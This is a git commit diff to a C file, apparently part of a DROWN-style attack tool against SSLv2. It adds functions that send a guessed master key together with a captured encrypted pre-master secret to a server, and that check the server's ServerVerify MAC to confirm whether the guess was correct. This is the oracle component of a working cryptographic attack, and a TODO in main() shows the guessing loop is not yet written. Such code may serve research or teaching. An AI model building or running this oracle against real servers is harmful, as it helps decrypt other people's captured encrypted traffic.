f3797ada4d732c9d27407c5696044ffb17bb843c
Andrei Ciupitu <andreyciupitu@gmail.com>
2018-12-27 22:44:13 +0200

    Added master key exchange with the server, and the check of the ServerVerify message required by the oracle.

--- oracle.c
+++ oracle.c
@@ -39,34 +39,37 @@ void ssl2_read_from_socket(SSL *s)
 	// Remove padding
 	s->s2->rlength=(((unsigned int)pos[0]) << 8) | ((unsigned int)pos[1]);
 
+	// Check header length
 	if ((pos[0] & TWO_BYTE_BIT))
 	{
 		s->s2->three_byte_header = 0;
 		s->s2->rlength &= TWO_BYTE_MASK;
 	}
-	// else
-	// {
-		// s->s2->three_byte_header = 1;
-		// s->s2->rlength &= THREE_BYTE_MASK;
-	// }
+	else
+	{
+		s->s2->three_byte_header = 1;
+		s->s2->rlength &= THREE_BYTE_MASK;
+	}
 	pos += 2;
 
-	// // Read padding if any
-	// if (s->s2->three_byte_header)
-		// s->s2->padding = *(pos++);
-	// else
+	// Read padding if any
+	if (s->s2->three_byte_header)
+		s->s2->padding = *(pos++);
+	else
 		s->s2->padding = 0;
 
 	// Adjust fields if cleartext or not
 	s->s2->mac_data = pos;
 	s->s2->ract_data = pos;
 	s->s2->ract_data_length = s->s2->rlength;
-	// if (!s->s2->clear_text)
-	// {
-		// unsigned int mac_size = EVP_MD_CTX_size(s->read_hash);
-		// s->s2->ract_data += mac_size;
-		// s->s2->ract_data_length -= mac_size;
-	// }
+
+	// Separate MAC from actual data
+	if (!s->s2->clear_text)
+	{
+		unsigned int mac_size = EVP_MD_CTX_size(s->read_hash);
+		s->s2->ract_data += mac_size;
+		s->s2->ract_data_length -= mac_size;
+	}
 }
 
 /*
@@ -178,6 +181,135 @@ int recv_server_hello(SSL *s)
 	return 1;
 }
 
+/*
+ * Sends the master key guess to the server
+ * master_key -> clear bytes of master key
+ * clear_bytes -> number of clear bytes
+ * encrypted_key -> encrypted pre master secret
+ * encrypted_key_length -> length of the pre master secret
+ */
+void send_master_key_guess(SSL *s,
+			unsigned char *master_key,
+			unsigned int clear_bytes,
+			unsigned char *encrypted_key,
+			unsigned int encrypted_key_length)
+{
+	unsigned char *buf = (unsigned char *)s->init_buf->data;
+	unsigned char *pos, *data;
+	unsigned int n;
+	const EVP_CIPHER *cipher;
+	const EVP_MD *md;
+
+	pos = buf;
+
+	// Skip over header
+	data = pos + 10;
+
+	// Get cipher and hash method for the session
+	ssl_cipher_get_evp(s->session, &cipher, &md, NULL, NULL, NULL);
+
+	// Message type
+	*(pos++) = SSL2_MT_CLIENT_MASTER_KEY;
+
+	// Cipher type selected by server
+	n = s->method->put_cipher_by_char(s->session->cipher, pos);
+	pos += n;
+
+	// Set required master key length
+	s->session->master_key_length = EVP_CIPHER_key_length(cipher);
+
+	// Set master key guess for the session
+	memcpy(s->session->master_key, master_key, s->session->master_key_length);
+
+	// Add number of clear bytes
+	n = clear_bytes;
+	s2n(n, pos);
+
+	// Add clear key bytes
+	memcpy(data, master_key, n);
+	data += n;
+
+	// Set encrypted key size in header
+	n = encrypted_key_length;
+	s2n(n, pos);
+
+	// Add the pre master secret to the message
+	memcpy(data, encrypted_key, n);
+	data += n;
+
+	// Set key IV as 0
+	n = EVP_CIPHER_iv_length(cipher);
+	s->session->key_arg_length = n;
+	memset(s->session->key_arg, 0, n);
+
+	// Set IV length
+	s2n(n, pos);
+
+	// Write key IV (only zeros)
+	memset(data, 0, n);
+	data += n;
+
+	// Total message size
+	s->init_num = data - buf;
+
+	// Send message
+	ssl2_write_to_socket(s);
+}
+
+/*
+ * Receives the ServerVerify message from the server
+ * and returns 1 if the master key guess was correct
+ * or 0 otherwise.
+ */
+int recv_server_verify(SSL *ssl)
+{
+	int result;
+	
+	// Receive message from server
+	ssl2_read_from_socket(ssl);
+
+	// We use some internal SSL functions
+	// So we need to set some additional parameters in
+	// the SSL object
+	ssl->s2->read_sequence = 1;
+	ssl->s2->clear_text = 0;
+
+	// Free the old encryption context
+	EVP_CIPHER_CTX_free(ssl->enc_write_ctx);
+	EVP_CIPHER_CTX_free(ssl->enc_read_ctx);
+	ssl->enc_write_ctx = NULL;
+	ssl->enc_read_ctx = NULL;
+
+	// We create a new context using the master key guess
+	assert(ssl2_enc_init(ssl, 1) == 1);
+
+	// Save a temp copy of the received data
+	// because decryption is done in place
+	unsigned char *temp = malloc(ssl->s2->rlength);
+	memcpy(temp, ssl->s2->mac_data, ssl->s2->rlength);
+
+	// We decrypt the received data with the master key guess
+	assert(ssl2_enc(ssl, 0) == 1);
+
+	// Compute the mac of the received data using our key
+	unsigned long mac_size = EVP_MD_CTX_size(ssl->read_hash);
+	unsigned char *mac = malloc(mac_size);
+	ssl2_mac(ssl, mac, 0);
+
+	// If our guess was correct, then the key should match
+	// with the one used by the server, so the macs should match
+	result = CRYPTO_memcmp(mac, ssl->s2->mac_data, mac_size) == 0;
+
+	// Copy back data
+	memcpy(ssl->s2->mac_data, temp, ssl->s2->rlength);
+
+	// Free memory
+	free(temp);
+	free(mac);
+
+	return result;
+}
+
 int main(int argc, char **argv)
 {
 	int res;
@@ -219,6 +351,7 @@ int main(int argc, char **argv)
 
 	// Set cipers for the session
 	// Suppose key len is 16 bytes
+	// Found these by using 'openssl ciphers -v -ssl2'
 	SSL_set_cipher_list(ssl, "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5");
 
 	// Init socket buffer
@@ -232,6 +365,12 @@ int main(int argc, char **argv)
 		printf("Cipher list is not supported\n");
 		return -1;
 	}
+
+	// TODO add master key guess here 
+	// Needs encrypted key data in order to work
+
+	SSL_CTX_free(ssl->ctx);
+	SSL_free(ssl);
 
 	return 0;
 }
